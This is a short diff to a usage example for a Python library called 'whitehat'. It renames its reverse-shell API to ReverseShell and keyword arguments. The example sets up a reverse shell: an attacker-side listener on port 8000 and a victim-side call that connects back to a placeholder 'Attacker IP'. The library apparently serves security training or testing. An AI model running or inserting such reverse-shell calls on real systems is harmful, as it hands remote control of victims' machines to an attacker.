@@ -1,7 +1,7 @@
 import whitehat
 
 ## For attacker
-whitehat.reverse_shell.attacker(8000)  # Your Port
+whitehat.ReverseShell.attacker(PORT=8000)  # Your Port
 
 ## For victim
-whitehat.reverse_shell.victim("attacker_ip", 8000) # (attacker_ip, attacker_port)
+whitehat.ReverseShell.victim(IP="Attacker IP", PORT=8000) # (attacker_ip, attacker_port)
